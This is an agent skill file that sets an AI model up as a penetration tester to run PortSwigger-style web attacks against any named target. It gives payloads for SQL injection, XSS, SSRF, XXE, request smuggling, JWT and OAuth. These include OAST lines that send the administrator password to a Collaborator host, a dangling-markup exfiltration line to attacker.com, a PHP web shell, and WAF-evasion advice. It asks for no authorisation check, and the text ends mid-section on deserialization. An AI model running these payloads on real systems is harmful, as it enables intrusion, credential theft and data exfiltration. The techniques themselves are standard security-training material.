---
name: portswigger-attacks
description: Complete PortSwigger methodology engine — 30+ attack classes with detection, exploitation, payloads, bypasses, and chaining from the Web Security Academy. SQLi (union/blind/OAST/second-order), XSS (reflected/stored/DOM/contexts/CSP bypass/AngularJS), CSRF (token/SameSite/Referer bypass), SSRF (11 bypass techniques), XXE (in-band/blind/XInclude/SVG), access control (vertical/horizontal/IDOR/multi-step/header override), authentication (brute force/MFA bypass/reset poisoning/remember-me), business logic (workflow bypass/encryption oracle), file upload (10 bypass techniques), command injection (blind/OAST/redirect), path traversal (encoding/null byte/absolute), information disclosure, race conditions (single-packet/TOCTOU/partial construction), NoSQL injection (syntax/operator/timing), API testing (mass assignment/SSPP/hidden params), web cache deception (delimiter/normalization/file rules), web cache poisoning (unkeyed inputs/key flaws/parameter cloaking), request smuggling (CL.TE/TE.CL/H2.CL/CL.0/browser-powered), JWT attacks (none/HS256 confusion/jwk/jku/kid injection), OAuth (CSRF/redirect_uri/scope/state/proxy page), deserialization (PHP/Java/Ruby/gadget chains), SSTI (detect/identify/exploit per engine), GraphQL (introspection/IDOR/alias batching/CSRF), HTTP Host header (reset poisoning/cache/SSRF/auth bypass), prototype pollution (client DOM XSS/server RCE via child_process), WebSockets (CSWSH/XSS via WS), DOM-based (12 sinks to XSS/clobbering), CORS (origin reflection/null/insecure protocol/intranet), clickjacking (overlay/prefilled/DOM XSS combo/frame buster bypass), LLM attacks (prompt injection/indirect/excessive agency/insecure output). Decision tree: maps target characteristics to applicable attacks. Chaining logic: IDOR→ATO, SSRF→cloud metadata, XSS→ATO, open redirect→OAuth theft, cache deception→session theft. Run with /portswigger-attacks against <target>.
---

# PortSwigger Methodology Attack Engine

Operate as a senior penetration tester using the complete PortSwigger Web Security Academy framework. When invoked against a target, systematically assess attack surface, determine applicable vectors, execute methodology-driven testing, chain findings, and produce detailed exploitation paths.

## CORE BEHAVIORAL RULES

- **Manual over automated** — prefer custom crafted requests over scanner signatures. Use scanners for recon, not for decisions.
- **Context-aware payloads** — adapt every payload to the specific injection context (HTML, JS, attribute, URL, JSON, XML, SQL, shell, template).
- **Response-guided iteration** — each response determines the next probe. Build a mental model of the back-end.
- **Assume nothing** — every header, parameter, cookie, and body field is an injection point until proven otherwise.
- **Prove, don't speculate** — no "could potentially." Demonstrate impact or move on.
- **Chain aggressively** — low-severity bugs become critical when chained. Always ask: "What can I reach now?"
- **Depth over breadth** — exhaust one attack class before moving to the next on a given endpoint.
- **Stealth when needed** — use encoding, timing jitter, and request pacing to avoid WAFs and rate limits.

## TARGET ASSESSMENT PHASE

Before any attack, map the target:

### Step 1: Technology Fingerprinting

Identify: server (Apache/Nginx/IIS), framework (Rails/Django/Laravel/Spring/Express), language (PHP/Java/Python/Ruby/Node.js), CDN (Cloudflare/Fastly/Akamai/CloudFront), caching layer, WAF presence.

Key indicators: `Server` header, `X-Powered-By`, `Set-Cookie` naming, error message formatting, default paths, file extensions, CSRF token patterns, session cookie names.

### Step 2: Attack Surface Enumeration

| Surface | What to Map |
|---|---|
| URL parameters | Every GET/POST parameter across all endpoints |
| HTTP headers | Custom headers, `X-Forwarded-*`, `X-Original-*`, auth headers |
| Cookies | Session tokens, tracking cookies, preference cookies |
| Request body | JSON, XML, multipart, url-encoded, GraphQL |
| File uploads | Extension, Content-Type, filename, metadata |
| WebSockets | Message content, handshake parameters |
| APIs | REST endpoints, GraphQL endpoint, SOAP services |
| Authentication flows | Login, MFA, password reset, OAuth, registration |
| Client-side JS | Hidden endpoints, API keys, internal paths, DOM sinks |

### Step 3: Authentication State Mapping

Identify: guest access, authenticated user, privileged user, admin. Map what each can access. Find the trust boundaries.

---

## ATTACK DECISION TREE

```
TARGET CHARACTERISTIC                →  PRIMARY ATTACK CLASSES
─────────────────────────────────────────────────────────────────
Has login form                       →  Authentication (brute force, enumeration, bypass)
                                       SQL injection in login
                                       NoSQL injection in login

Has file upload                      →  File upload (RCE via web shell, polyglots, config)
                                       XXE via SVG/DOCX upload
                                       Stored XSS via HTML/SVG upload

Has search/reflection                →  XSS (reflected, stored, DOM)
                                       SSTI (if template syntax evaluates)
                                       SQL injection

Has user-specific content (/profile) →  IDOR / horizontal privilege escalation
                                       Access control bypass
                                       CSRF on state-changing actions

Has admin panel/privileged actions   →  Vertical privilege escalation
                                       Access control bypass
                                       Parameter-based role manipulation

Has API endpoints                    →  Mass assignment
                                       Server-side parameter pollution
                                       API-specific injection
                                       JWT attacks

Uses JWT for auth                    →  JWT attacks (alg confusion, none, kid, jku, jwk)
                                       Brute force weak HMAC secrets

Uses OAuth                           →  OAuth attacks (CSRF, redirect_uri, scope, state)

Has GraphQL endpoint                 →  Introspection, IDOR via arguments, alias batching

Uses caching/CDN                     →  Web cache poisoning, web cache deception

Front-end/back-end architecture      →  Request smuggling, Host header attacks

Has WebSocket connections            →  CSWSH, XSS via WS, input injection

Uses templates/server-side rendering →  SSTI

Uses NoSQL database                  →  NoSQL injection (syntax + operator)

Has multi-step processes             →  Race conditions, business logic flaws

Has password reset flow              →  Password reset poisoning (Host header)
                                       Token predictability

Has email functionality              →  Email header injection
                                       Race conditions in email-based ops

Has XML parsing                      →  XXE injection, XInclude, SVG upload XXE

Uses serialized objects              →  Insecure deserialization

Has LLM/AI features                  →  Prompt injection, indirect injection, excessive agency

Internal/private IPs accessible      →  SSRF, Host header routing attacks

Uses client-side JS with merge/assign→  Prototype pollution (client-side → DOM XSS)
                                       Prototype pollution (server-side → RCE)

Has CORS headers                     →  CORS misconfiguration exploitation

Supports framing                     →  Clickjacking, frame buster bypass

Error messages visible               →  Information disclosure, error-based SQLi

Has rate limiting                    →  Race conditions (limit overrun), alias batching
```

---

## SERVER-SIDE ATTACK MODULES

### SQL INJECTION

**Detection (5 methods):**
- Single quote `'` → look for errors/behavior change
- Syntax-specific: `' OR 'a'='a` vs `' OR 'a'='b` → compare responses
- Boolean: `' AND 1=1--` vs `' AND 1=2--` → true/false differential
- Time delay: `'; WAITFOR DELAY '00:00:10'--` (MSSQL) or `'; SELECT pg_sleep(10)--` (PostgreSQL)
- OAST: `'; exec master..xp_dirtree '//BURP-COLLAB/a'--` or `SELECT EXTRACTVALUE(xmltype('...'),'/l') FROM dual`

**UNION Attack Methodology:**
1. Determine column count: `' ORDER BY 1--` increment until error; or `' UNION SELECT NULL--`, `' UNION SELECT NULL,NULL--` until valid
2. Find string columns: `' UNION SELECT 'a',NULL,NULL--` rotating through positions
3. Extract data: `' UNION SELECT username, password FROM users--`
4. Single column concatenation: Oracle `||'~'||`, PostgreSQL `||'~'||`, MSSQL `+'~'+`, MySQL `CONCAT(x,'~',y)`

**Blind SQLi — Boolean:**
```
' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'--
```
Iterate character by character, comparing response differences.

**Blind SQLi — Error-Based:**
```
' AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--
```
Divide-by-zero on true condition → detectable error.

**Blind SQLi — Time-Based:**
```
'; IF (SELECT COUNT(*) FROM users WHERE username='administrator' AND SUBSTRING(password,1,1)>'m')=1 WAITFOR DELAY '00:00:10'--
```

**Blind SQLi — OAST Exfiltration:**
```
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='administrator');exec('master..xp_dirtree "//'+@p+'.BURP-COLLAB/a"')--
```

**Second-Order SQLi:** Inject payload into stored field → trigger later when retrieved and unsafely concatenated into a query.

**Bypass Techniques:**
- Comment styles: `--`, `#`, `/* */`
- URL encoding: `%27` for `'`
- Double encoding: `%2527`
- Hex encoding in XML: `&#x53;ELECT`
- Case variation: `SeLeCt`
- Whitespace alternatives: `/**/`, tabs, newlines
- Null byte: `%00` to terminate strings

**Post-Exploitation:**
- Version: Oracle `SELECT * FROM v$version`, MSSQL `SELECT @@version`, MySQL `SELECT @@version`, PostgreSQL `SELECT version()`
- Tables: `SELECT * FROM information_schema.tables`
- Columns: `SELECT * FROM information_schema.columns WHERE table_name='users'`

---

### CROSS-SITE SCRIPTING (XSS)

**Testing Methodology:**
1. Submit unique alphanumeric string into every entry point
2. Find every location where it's reflected in responses
3. For each reflection point, determine context: HTML body, attribute, JS string, template literal, URL, CSS
4. Select context-appropriate payload
5. Chrome v92+ uses `print()` as PoC (cross-origin iframes block `alert()`)

**Context-Specific Payloads:**

HTML body context:
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

Attribute context (with value attribute):
```
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
```

Attribute context (href/src):
```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

JavaScript string context:
```
'; alert(1);//
'-alert(1)-'
</script><script>alert(1)</script>
```

Template literal (backtick context):
```
${alert(1)}
```

AngularJS (pre-1.6 sandbox):
```
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
```

**DOM-based (sink-focused):**
- `innerHTML` sink: `<img src=x onerror=alert(1)>`
- `document.write()` sink: `<script>alert(1)</script>`
- `eval()` sink: `'; alert(1);//`
- `location` sink: `javascript:alert(1)`
- `script.src` sink: controllable URL → load attacker JS
- `setTimeout`/`setInterval` string arg: JS injection

**Bypass Techniques:**
- HTML entity encoding inside `<script>` tags (browser decodes before JS parsing)
- Event handlers: `onerror`, `onload`, `onfocus`, `onmouseover`, `ontoggle`, `onanimationend`
- `data:` URI scheme for href/src attributes
- `vbscript:` for legacy IE
- Case obfuscation: `<ScRiPt>`, `<ImG oNeRrOr=...>`
- Null byte injection: `<script>alert(1)%00</script>`
- Polyglot payloads: work in multiple contexts simultaneously
- CSP bypass: AngularJS `$event` directives, JSONP endpoints, policy injection

**XSS Exploitation:**
- Cookie theft: `document.cookie` → exfil to attacker server
- Credential capture: inject fake login form
- CSRF bypass: XSS reads CSRF token from page, submits forged request
- Keylogging: `addEventListener('keydown', ...)`
- DOM manipulation: defacement, phishing overlays

**Dangling Markup Injection:**
Used when full XSS blocked. Captures data cross-domain via unclosed attribute + injected tags:
```
<img src='https://attacker.com/steal?data=
```
Victim's browser completes the attribute with subsequent page content, sending it to attacker.

---

### CROSS-SITE REQUEST FORGERY (CSRF)

**Three conditions must hold:**
1. A relevant state-changing action exists
2. Application uses cookie-based session handling exclusively
3. No unpredictable request parameters

**Basic Exploit:**
```html
<form action="https://target.com/email/change" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

**CSRF Token Bypasses (5 techniques):**

| Technique | How |
|---|---|
| Method switch | Token validated on POST only → switch to GET |
| Token omission | Remove token parameter entirely → server skips validation |
| Not session-bound | Use attacker's own valid token (constant across users) |
| Cookie-injected token | Token validated against cookie attacker can set (subdomain cookie injection) |
| Duplicated in cookie | Set body token and cookie to same attacker-chosen value |

**SameSite Cookie Bypasses:**
- `Lax`: Works for GET-based state changes; use on-site gadgets for POST; trigger new cookies without SameSite
- `Strict`: Compromise sibling subdomain on same registered domain

**Referer-Based Defense Bypasses:**
- Omit Referer: `<meta name="referrer" content="no-referrer">`
- Circumvent regex: host exploit on `target.com.attacker.com` or use target's open redirect

---

### SERVER-SIDE REQUEST FORGERY (SSRF)

**Detection Vectors:**
- Full URLs in parameters: `stockApi=`, `url=`, `path=`, `destination=`
- Partial URLs: `host=`, `domain=` combined server-side into full URL
- Referer header: analytics may visit URLs in Referer
- XML data: XXE-based SSRF
- Host header: routing-based SSRF

**Loopback Payloads:**
```
http://127.0.0.1/admin
http://localhost/admin
http://[::1]/admin
http://2130706433/admin        (decimal IP)
http://017700000001/admin      (octal)
http://127.1/admin             (truncated)
http://spoofed.burpcollaborator.net  (DNS resolves to 127.0.0.1)
```

**Blacklist Bypass Techniques:**
- Alternative IP representations (decimal, octal, truncation)
- DNS name resolving to 127.0.0.1
- URL encoding/double-encoding blocked strings
- Case variation
- Open redirect chaining: `http://allowed-domain/redirect?url=http://169.254.169.254`

**Whitelist Bypass (URL parsing discrepancies):**
```
https://expected-host:fakepass@evil-host    (credentials embed)
https://evil-host#expected-host             (fragment confusion)
https://expected-host.evil-host             (DNS hierarchy)
https://%65xpected-host@evil-host          (URL encoding)
```

**Blind SSRF Detection:**
- OAST: cause server to connect to your Collaborator/Burp Collaborator
- Time-based: target internal hosts and measure delays

**Cloud Metadata Targets:**
```
AWS:     http://169.254.169.254/latest/meta-data/
GCP:     http://metadata.google.internal/computeMetadata/v1/
Azure:   http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

**Exploitation Flow:** Identify parameter → test loopback → apply bypasses → pivot to internal IPs → target cloud metadata or internal services → if blind, use OAST.

---

### XXE INJECTION

**Classic In-Band (File Read):**
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

**SSRF via XXE:**
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal.target.com/">]>
```

**Blind XXE — OAST:**
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://BURP-COLLABORATOR/">]>
```

**Blind XXE — Error-Based Exfiltration:**
```xml
<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLABORATOR/?x=%file;'>">
%eval; %exfil; ]>
```

**Blind XXE — Local DTD Repurposing:**
Locate an existing DTD file on server, redefine its entities to leak data via error messages:
```xml
<!DOCTYPE foo [<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">'>
%local_dtd; ]>
```

**Hidden Attack Surface:**
- XInclude: When cannot control full XML doc:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```
- File upload vectors: SVG images, DOCX/XLSX (ZIP of XML)
- Content-Type switch: Change `application/x-www-form-urlencoded` to `text/xml`, send XML body

---

### ACCESS CONTROL

**Vertical Privilege Escalation Vectors:**
- Browse to `/admin`, `/administrator`, `/manager` directly
- Check `robots.txt` for hidden paths
- Inspect JS for role-based URL construction (URL may be revealed even if link hidden):
```javascript
var isAdmin = false;
if (isAdmin) { adminPanelTag.setAttribute('href', '/administrator-panel-yb556'); }
```
- Parameter-based roles: `?admin=true`, `?role=1`, `?access=admin`
- Cookie-based roles: `Role: admin` cookie
- Header overrides: `X-Original-URL: /admin/deleteUser`, `X-Rewrite-URL: /admin`
- Method tampering: POST `DENY` → switch to GET on same URL
- URL matching flaws: `/ADMIN/DELETEUSER` vs `/admin/deleteUser`, trailing slashes, Spring suffix matching (`/admin/deleteUser.anything`)

**Horizontal Privilege Escalation (IDOR):**
- GUID/ID in URL: `?id=123` → try `?id=124`
- GUID leakage: check messages, reviews, user references in responses
- Redirect responses may still contain sensitive data before redirect

**Multi-Step Process Flaws:**
- Step 1 and 2 protected; step 3 unprotected
- Direct submission of step 3 with required parameters → bypass

**Referer-Based Access Control:**
Forge `Referer: https://target.com/admin` header to pass checks on sub-pages.

---

### AUTHENTICATION

**Brute Force & Enumeration:**
- Username enumeration via response differences (error messages, timing, status codes)
- Password brute-force using known usernames
- Rate limit bypass: `X-Forwarded-For` manipulation, multi-IP, credential stuffing across accounts
- Account locking: test threshold; use for DoS or enumeration oracle

**MFA Bypass Techniques:**
- Step-jumping: access `/account` directly after completing step 1, skipping 2FA
- Code not session-bound: supply your session but victim's 2FA code
- Brute-force MFA codes: short numeric codes (4-6 digits) without rate limiting
- Code re-use: same code valid for multiple attempts
- Predictable codes: sequential or time-based with known seed

**Password Reset Attacks:**
- Token predictability: sequential IDs, timestamps, weak hashes
- Token reuse: not invalidated after use
- Reset poisoning: manipulate `Host` header → reset link points to attacker domain
- Token leakage: sent over HTTP, exposed in Referer

**"Remember Me" Attacks:**
- Predictable token generation: `base64(username+timestamp)`, `md5(password)`
- Static tokens that never expire
- Token exposed in URL/Referer headers

**HTTP Basic Auth:** Credentials in base64 (not encrypted); no brute-force protection.

---

### BUSINESS LOGIC VULNERABILITIES

**Detection Approach:** These are invisible to automated scanners. Think about developer assumptions:
- "Users fill in the form in order"
- "Users only submit expected values"
- "Users only interact through the UI"
- "One component's behavior doesn't affect another"

**Key Attack Patterns:**
- **Excessive trust in client-side controls:** Intercept and modify any value the client sends (price, quantity, discount, role). The client is always untrusted.
- **Failing to handle unconventional input:** Negative quantities, extreme values, empty/null inputs, unexpected data types, array instead of scalar
- **Workflow bypass:** Skip steps, reorder steps, revisit completed steps
- **Domain-specific flaws:** Understand the business to identify what "shouldn't happen"
- **Encryption oracle:** System encrypts/decrypts attacker-supplied data → use to crack encryption or forge values
- **Email parser discrepancies:** Different components parse email addresses differently → bypass domain restrictions

**Testing Method:** For each workflow, ask: "What happens if I skip this step? Repeat it? Do it out of order? Supply unexpected values?"

---

### FILE UPLOAD VULNERABILITIES

**Unrestricted → RCE:**
Upload `.php` file, access directly via HTTP:
```php
<?php echo system($_GET['cmd']); ?>
```
Usage: `GET /uploads/shell.php?cmd=id`

**Content-Type Bypass:**
Change `Content-Type` in multipart part header to `image/jpeg` while actual content is PHP.

**Extension Blacklist Bypasses:**

| Technique | Example |
|---|---|
| Alternative extensions | `.php5`, `.phtml`, `.shtml`, `.php4`, `.php7`, `.inc` |
| Case mismatch | `exploit.pHp` |
| Double extensions | `exploit.php.jpg` |
| Trailing chars | `exploit.php.` or `exploit.php%20` |
| URL encoding | `exploit%2Ephp` |
| Null byte | `exploit.php%00.jpg` |
| Unicode | `xC0 x2E` → `.` |
| Recursive strip bypass | `exploit.p.phphp` (strip `.php` → `exploit.php`) |

**Configuration File Upload:**
- Apache `.htaccess`: `AddType application/x-httpd-php .txt` → `.txt` executed as PHP
- IIS `web.config`: `<mimeMap fileExtension=".json" mimeType="application/json"/>`

**Content Validation Bypass:**
Create polyglots — valid image with PHP in metadata:
- Add `GIF89a` header prefix
- Use ExifTool to embed PHP in JPEG metadata
- The file passes content checks but executes when accessed

**Race Condition Upload:**
File saved temporarily before validation → concurrently access it before deletion.

**Non-RCE Exploitation:**
- SVG with embedded JS: `<svg><script>alert(1)</script></svg>` → Stored XSS
- HTML file upload → Stored XSS
- Crafted DOCX/XLSX → XXE via XML parsing

**Upload via PUT:**
`OPTIONS` request → if `PUT` in `Allow` header → `PUT /path/shell.php` with PHP body.

**Path Traversal in Filename:**
Set filename to `../../../var/www/html/shell.php` to write outside uploads directory.

---

### OS COMMAND INJECTION

**Detection:**
- In-band: `& echo test123 &` → look for "test123" in response
- Time-based: `& ping -c 10 127.0.0.1 &` → 10 second delay
- OAST: `& nslookup BURP-COLLAB &` → DNS callback
- Output redirect: `& whoami > /var/www/static/whoami.txt &` → retrieve via browser

**Shell Metacharacters:**
```
&  (background/separator — cross-platform)
&& (AND chain)
|  (pipe)
|| (OR chain)
;  (separator — Unix)
`  (inline execution — Unix)
$() (inline execution — Unix)
\n (newline separator — Unix)
```

**Exfiltration via DNS:**
```
& nslookup `whoami`.BURP-COLLAB.com &
```

**Defense note:** Never escape shell metacharacters — too error-prone. Use whitelist validation or avoid OS commands entirely.

---

### PATH TRAVERSAL

**Basic Payloads:**
```
../../../etc/passwd          (Unix)
..\..\..\windows\win.ini     (Windows)
```

**Filter Bypass Techniques:**

| Filter | Bypass |
|---|---|
| Blocks `../` | Absolute path: `/etc/passwd` |
| Strips `../` | Nested: `....//....//....//etc/passwd` |
| Blocks `../` | URL encode: `%2e%2e%2f` |
| Blocked encoded | Double encode: `%252e%252e%252f` |
| Unicode filter | Overlong UTF-8: `..%c0%af`, `..%ef%bc%8f` |
| Requires base folder | Prefix: `/var/www/images/../../../etc/passwd` |
| Requires `.png` extension | Null byte: `../../../etc/passwd%00.png` |

---

### INFORMATION DISCLOSURE

**Discovery Vectors:**
- `/robots.txt` → hidden directories
- Directory listing → exposed files
- Developer comments in HTML/JS → hidden endpoints, credentials
- Verbose error messages → DB schema, file paths, framework versions
- Backup files: `.bak`, `.old`, `.swp`, `~`, `.save`
- Hardcoded secrets in JS: API keys, IPs, credentials
- Debug endpoints: diagnostic data, stacks, environment variables
- `.git/` or `.svn/` exposure → full source code history
- Server headers: `Server`, `X-Powered-By` → version → CVE lookup
- Behavioral enumeration: timing/status code differences → existence oracle

**Severity:** Framework version alone = low. Chain with known CVE → critical.

---

### RACE CONDITIONS

**Key Concept:** The race window is the brief period between check and action where a collision occurs.

**Limit Overrun (TOCTOU):** Redeem coupon multiple times, rate multiple times, bypass anti-brute-force.

**Single-Packet Attack (HTTP/2):**
Use Burp Repeater "Send group in parallel" mode. For Turbo Intruder:
```python
engine=Engine.BURP2
concurrentConnections=1
```
Network jitter eliminated by sending 20-30 requests in a single TCP packet.

**Multi-Endpoint Race Conditions:**
- Connection warming: send inconsequential requests first to smooth processing
- Abuse rate/resource limits: trigger limits intentionally to introduce server-side delay

**Partial Construction Race Conditions:**
Objects created in multiple steps → exploit the middle state. Send parallel requests to access partially-constructed objects with uninitialized properties.

**Session-Based Locking Bypass:** PHP only processes one request per session at a time → use different session tokens for parallel requests.

**Detection:** Benchmark (sequential) → parallel probe → look for deviations in response, email content, or application state.

---

### NOSQL INJECTION

**Detection Fuzz String (MongoDB):**
```
'"`{ ;$Foo} $Foo \xYZ
```

**Syntax Injection — Conditional Test:**
```
' && 0 && 'x     (false)
' && 1 && 'x     (true)
```
Different responses → injection confirmed.

**Syntax Injection — Data Retrieval:**
```
' || '1'=='1      (always true → all items)
fizzy'%00         (null byte → strips trailing conditions)
```

**Operator Injection — Authentication Bypass:**
```json
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```
Matches first user in collection.

**Targeted Bypass with `$in`:**
```json
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

**Data Extraction via `$regex`:**
```json
{"username":"admin","password":{"$regex":"^a.*"}}
```
Character-by-character extraction: `^ab.*`, `^abc.*`

**Data Extraction via `$where` (JavaScript):**
```
admin' && this.password[0]=='a' || 'a'=='b
```

**Timing-Based (Blind):**
```json
{"$where": "sleep(5000)"}
```

**URL Parameter to JSON Operator Conversion:**
`username=wiener` → `username[$ne]=invalid` or switch to POST with `Content-Type: application/json`.

---

### API TESTING

**Discovery:**
- Paths: `/api`, `/swagger/index.html`, `/openapi.json`
- JS files: grep for `/api/`, endpoint references
- Intruder wordlists for common API paths and parameters

**HTTP Method Testing:**
Cycle through `GET`, `POST`, `PUT`, `PATCH`, `DELETE`, `OPTIONS` — different methods may hit different handlers.

**Content Type Manipulation:**
Switch between `application/json` and `application/xml` → different parser behavior → different vulnerabilities.

**Mass Assignment:**
1. `GET /api/users/me` → observe all fields in response
2. `PATCH /api/users/me` → add fields from GET response that weren't in original PATCH
3. If `isAdmin: true` accepted → privilege escalation

**Server-Side Parameter Pollution (SSPP):**
- Query string: inject duplicate/extra params to override or truncate
- REST paths: test path parameter injection
- Structured data: duplicate keys in JSON (behavior varies by parser)

**Hidden Parameter Discovery:**
- Param Miner BApp: up to 65,536 param names per request
- Response analysis: fields in response but not in request → test if writable

---

## ADVANCED TOPIC MODULES

### HTTP REQUEST SMUGGLING

**Classic Types:**
- **CL.TE:** Front-end uses `Content-Length`, back-end uses `Transfer-Encoding`
- **TE.CL:** Front-end uses `Transfer-Encoding`, back-end uses `Content-Length`
- **TE.TE:** Obfuscate `Transfer-Encoding` header to make one server ignore it

**CL.TE Payload:**
```
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**TE.CL Payload:**
```
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

**TE.TE Obfuscation Payloads:**
```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
```

**Exploitation Goals:**
- Bypass front-end security controls
- Reveal front-end request rewriting (leaked internal headers)
- Capture other users' requests (session tokens, auth data)
- Reflected XSS delivery to victims
- Open redirect via Host header injection
- Web cache poisoning/deception

**Advanced Types:**
- **H2.CL/H2.TE:** HTTP/2 downgrading to HTTP/1.1 creates parsing ambiguity
- **CRLF Injection in H2:** Inject `\r\n` into header values via HTTP/2 binary format
- **Response Queue Poisoning:** Desynchronize front-end/back-end response pairing → steal victim responses
- **CL.0:** Back-end ignores `Content-Length` entirely → body becomes next request prefix
- **H2.0:** Same as CL.0 but via HTTP/2 downgrading
- **Client-Side Desync:** Victim's browser desyncs its own connection → session hijacking, cache poisoning
- **Pause-Based Desync:** Server pauses during processing → reads more socket data → consumes next request

**Detection (Timing Techniques):**
- Send ambiguous request + normal request on same connection
- Observe timing differences, response anomalies, or cache hit/miss patterns

---

### WEB CACHE POISONING

**Three-Step Construction:**
1. Identify unkeyed inputs (headers, cookies, query params excluded from cache key)
2. Elicit harmful response using unkeyed input (XSS, redirect, malicious import)
3. Get response cached so it's served to victims

**Finding Unkeyed Inputs:**
- Add random headers (`X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`, custom headers)
- Add random query parameters
- Use Param Miner BApp → "Guess headers"
- Always add cache buster to requests during testing

**Cache Key Exploits:**
- **Unkeyed port:** Cache ignores port → poison via different port
- **Unkeyed query string:** Add malicious params → cache ignores them, back-end processes them
- **Parameter cloaking:** Cache and back-end parse query string differently (`;` vs `&`)
- **Normalized keys:** Cache normalizes path but back-end uses original
- **Key injection:** Inject into key component (Host header, path)

**Finding a Cache Oracle:** Endpoint that reveals cache status (`X-Cache: hit/miss` header, timing differences, response content changes).

---

### WEB CACHE DECEPTION

**Core Discrepancy Types:**
- **Path mapping:** Cache uses traditional mapping (full path with extension); origin uses REST mapping (ignores trailing path segments)
  - Payload: `/user/profile/wcd.css` → cache sees `.css`, origin returns profile data
- **Delimiter discrepancies:** Different parsers use different delimiters (`;` in Java Spring, `.` in Ruby on Rails, `%00` in OpenLiteSpeed)
  - Payload: `/profile;foo.css` → origin truncates at `;`, cache sees `.css`
- **Normalization discrepancies:** Cache vs origin resolve dot-segments differently
  - Payload: `/static/..%2fprofile` → cache matches `/static` prefix, origin resolves to `/profile`

**Delimiter Testing:**
1. Add arbitrary string to path: `/endpoint/aaa` (baseline)
2. Insert delimiter between path and string: `/endpoint;aaa` → if same as baseline, `;` is delimiter
3. Add static extension: `/endpoint;aaa.css` → if cached, cache doesn't use `;` + rule for `.css` exists

**Key Constraint:** Encode dot-segments to prevent browser from resolving them before sending.

---

### JWT ATTACKS

1. **Accepting Arbitrary Signatures:** Library uses `decode()` instead of `verify()`. Modify payload claims → server accepts.

2. **`alg: none`:**
```
{"alg": "none", "typ": "JWT"}
```
Bypass filtering with `None`, `NONE`, `nOnE`. Payload still needs trailing dot.

3. **Brute-Force Weak HMAC Secret:**
```
hashcat -a 0 -m 16500 <jwt> <wordlist>
```
Use known secrets wordlist. Once cracked, forge any token.

4. **Algorithm Confusion (RS256 → HS256):**
- Obtain server's public key (often at `/.well-known/jwks.json`)
- Change `alg` to `HS256`
- Sign modified JWT using the public key as HMAC secret
- Server uses public key as HMAC key → signature verifies

5. **`jwk` Injection (Embedded Key):** Generate RSA key pair. Sign modified JWT with private key. Embed public key in `jwk` header parameter. Server uses embedded key instead of its own.

6. **`jku` Injection (JWK Set URL):** Host JWK Set on your server. Set `jku` header to your URL. Server fetches your key to verify. Bypass whitelist via URL parsing discrepancies.

7. **`kid` Injection — Path Traversal:** Set `kid` to `../../dev/null` → server reads empty file as key → sign with empty string. Or point to predictable static file and sign with its contents.

8. **`kid` Injection — SQLi:** If keys in database, `kid` parameter may be vulnerable to SQL injection.

9. **`cty` (Content Type):** Set `cty: text/xml` → triggers XXE. Set `cty: application/x-java-serialized-object` → triggers deserialization.

10. **`x5c` (X.509 Certificate Chain):** Inject self-signed certificate → similar to `jwk` injection. Known CVEs: CVE-2017-2800, CVE-2018-2633.

---

### OAUTH AUTHENTICATION ATTACKS

**Recon:**
- Check `/.well-known/oauth-authorization-server` and `/.well-known/openid-configuration`
- Identify `client_id`, `redirect_uri`, `response_type`, `scope`, `state` in authorization requests

**Implicit Flow — No Server-Side Secret:**
Intercept POST after token receipt → modify `user_id`/`email` to victim's identifier → server creates session for victim using your valid token.

**CSRF — Missing `state` Parameter:**
- Account hijacking: bind attacker's social account to victim's app account
- Login CSRF: trick victim into logging into attacker's account

**Redirect URI Validation Bypasses:**
- Prefix-based: append path/query to whitelisted base
- URI parsing discrepancies: `https://whitelisted.com &@evil.net#@evil.net/`
- Duplicate parameters: submit `redirect_uri` twice — server uses one for validation, other for redirect
- `localhost` subdomain: `localhost.evil.net` if `localhost` prefix allowed
- Response mode manipulation: switch from `query` to `fragment` or `web_message`

**Code/Token Theft via Proxy Pages:**
- Path traversal in redirect URI: `https://client-app.com/callback/../../other/page`
- Chain with open redirect on whitelisted domain
- Chain with XSS on whitelisted domain (elevates XSS: no HttpOnly cookie barrier)
- HTML injection for Referer leakage: `<img src="evil.net">`

**Scope Upgrade:** During code/token exchange, add extra scope parameters not originally approved.

**Unverified User Registration:** Register on OAuth provider with victim's email (if no verification) → login to client app as victim.

---

### INSECURE DESERIALIZATION

**Identification:**
- PHP: `O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}`
- Java: Binary serialized objects (look for `ac ed 00 05` magic bytes)
- Ruby: YAML or Marshalled objects
- Python: Pickled objects (look for `cos\nsystem\n` or base64 encoded)

**Attack Methods:**
- Modify object attributes directly (change `isAdmin` to `true`)
